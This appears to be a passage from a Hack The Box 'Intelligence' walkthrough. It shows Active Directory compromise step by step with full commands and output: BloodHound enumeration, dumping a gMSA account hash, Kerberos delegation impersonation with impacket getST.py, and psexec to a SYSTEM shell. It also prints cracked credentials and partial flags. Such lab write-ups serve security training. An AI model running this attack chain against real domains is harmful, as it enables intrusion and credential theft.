TED.GRAVES::intelligence:a05b4d5954cda62a:01bc90791f5a1b20749132515e433b9e:0101000000000000a4a107b5ee50da018834b39ca222c60b000000000200080041004e003100530001001e00570049004e002d0048004300320048005a0052004500330053005a0047000400140041004e00310053002e004c004f00430041004c0003003400570049004e002d0048004300320048005a0052004500330053005a0047002e0041004e00310053002e004c004f00430041004c000500140041004e00310053002e004c004f00430041004c000800300030000000000000000000000000200000d7a1e0644e31207b7101ad61404f4965074792a2ea942aac10a32c3dcf11913e0a0010000000000000000000000000000000000009003c0048005400540050002f007700650062002d0074006500730074002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy
```

## BloodHound

 Now Let's run bloodhound-python, an investigator used to gather information from all over the domain. After it's completion, run bloodhound and upload it to bloodhound and start investigation on graph's.
 
```shell
bloodhound-python -c All -u 'Ted.Graves' -p 'Mr.Teddy' -d intelligence.htb -ns 10.10.10.248 --zip
INFO: Found AD domain: intelligence.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 43 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: svc_int.intelligence.htb
INFO: Querying computer: dc.intelligence.htb
WARNING: Could not resolve: svc_int.intelligence.htb: The DNS query name does not exist: svc_int.intelligence.htb.
INFO: Done in 00M 59S
INFO: Compressing output into 20240126181734_bloodhound.zip
```

Now the upload it to Bloodhound(**an Active Directory (AD) reconnaissance tool that can reveal hidden relationships and identify attack paths within an AD environment**). To run Bloodhound we first need to start neo4j a graph database system. 

```shell
sudo neo4j console
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
```

Now type simple bloodhound in new terminal and press enter to start the bloodhound. If you are running bloodhound for the first time you need to reset the default credentials of bloodhound which is `neo4j:neo4j`. After logging into the bloodhound upload the zip file we create by **bloodhound-python**. You can use both methods, either drag and drop the file into bloodhound or by using upload data button and wait for data to upload into the database. 

<img alt="Pasted image 20240127043922" src="https://github.com/iammR0OT/HTB/assets/74102381/6c1097a9-cd65-4055-9ec9-80b99d80f64e">


After data upload process search for user, **Ted.Graves** and **Tiffny.Milnes** in search bar and mark them both as a owned user's.

<img  alt="Pasted image 20240127044133" src="https://github.com/iammR0OT/HTB/assets/74102381/fa1abc63-6c61-49c0-b7cc-adccf238692d">

Now move to Analysis Tab and under shortest path section click on **shortest path from owned principals** and we discover that our user, Ted.Graves is a member of **ITSupport** group which has **ReadGMSAPassword** rights on **SVC_INT.intelligence.htb** account. SVC_INT.intelligence.htb is an Group Managed Service Account (GMSA) is a type of object in AD which password is managed by and automatically changed by Domain Controller on a set interval of time. And the user SVC_INT.intelligence have **delegate writes** on DC, which means we can impersonate to **Administrator** with the password of SVC_INt account. To Learn more about impersonate attack give hit to [this](https://www.onsecurity.io/blog/abusing-kerberos-from-linux/#impersonation-tickets) article.

<img alt="Pasted image 20240127044448" src="https://github.com/iammR0OT/HTB/assets/74102381/eb56d06b-45d1-4537-acf0-675b8e8078fe">

<img  alt="Pasted image 20240127050236" src="https://github.com/iammR0OT/HTB/assets/74102381/1141555e-6645-4644-8e33-9d53e9a4e449">

## Exploitation

First of all we need to get the password of SVC_INT service account, which we can get through tool pass [gMSADumper.py](https://github.com/micahvandeusen/gMSADumper.git) and we get the password hash of SVC_INT account.

<img alt="Pasted image 20240127050734" src="https://github.com/iammR0OT/HTB/assets/74102381/a964e98b-dd9a-4b38-8c8e-795753a92390">

```shell
python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb'
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::e0dcda8d93bf71a6352ea7803c8f17f1
svc_int$:aes256-cts-hmac-sha1-96:fd6235dbfd8a560d17433b22022633ed7188588277cf4d174f6582daf2c5333f
svc_int$:aes128-cts-hmac-sha1-96:059ae234e725682d00c3c278b3cff01b
```
### Abusing Delegation rights through Impersonation

I tried to crack this hash but didn't succeed but we can perform **pass-the-hash** attack here to login to the SVC_INT service account. We can also use this Service account hash to create a **forged ticket** to get access to Admin account. You can learn more about it [here](https://www.onsecurity.io/blog/abusing-kerberos-from-linux/#impersonation-tickets)
Before Creating the ticket make sure that you machine time is **sync** with the time of DC because **kerberose** authentication use time stamps as a part of protcol. You can learn more about it [here](http://kb.mit.edu/confluence/pages/viewpage.action?pageId=3908114)

```shell
$ sudo ntpdate 10.10.10.248
[sudo] password for kali: 
2024-01-27 10:38:43.314849 (-0500) +2.456722 +/- 0.078303 10.10.10.248 s1 no-leap
CLOCK: time stepped by 2.456722
```

So let's create a ticket to impersonate to Admin account on DC because SVC_INT have delegate rights on DC. We will use tool called **getST.py**(a tool used to create a Silver ticket) from **impacket** toolkit.

```shell
$ python3.10 /opt/impacket/examples/getST.py -spn www/dc.intelligence.htb  -impersonate Administrator -hashes :e0dcda8d93bf71a6352ea7803c8f17f1 -dc-ip 10.10.10.248 intelligence.htb/svc_int
Impacket v0.11.0 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

Now export this ticket name to a global CNAME variable called **KRB5CCNAME** so that each **impacket** script can access it.

```shell
$ export KRB5CCNAME=Administrator.ccache
```

Now you can you different tools, like psexec or wimexec to gain a shell on a machine. We will be using **psexec** here. Here **-k** is for kerberose authentication.

```shell
$ psexec.py -k -no-pass dc.intelligence.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on dc.intelligence.htb.....
[*] Found writable share ADMIN$
[*] Uploading file VwqHfTVM.exe
[*] Opening SVCManager on dc.intelligence.htb.....
[*] Creating service CzIr on dc.intelligence.htb.....
[*] Starting service CzIr.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1879]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami 
nt authority\system
```

### Extra

If you getting error like below. Make sure your machine time is sync with the DC time using **ntpdate**. and you are using the correct domain name which you provided while creating a ticket like if you provide **dc.intelligence.htb** you should be giving this while authenticating through ticket like `psexec.py -k -no-pass dc.intelligence.htb` not `psexec.py -k -no-pass intelligence.htb` becuase the SVC_INT service account exist on dc.intelligence.htb not on intelligence.htb.

```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
```

# Flags

User: 0f7146d1036fb......36a28c7367c485
Root: 91b9f2f7b385........986958a120443f6a

# Happy Hacking ❤
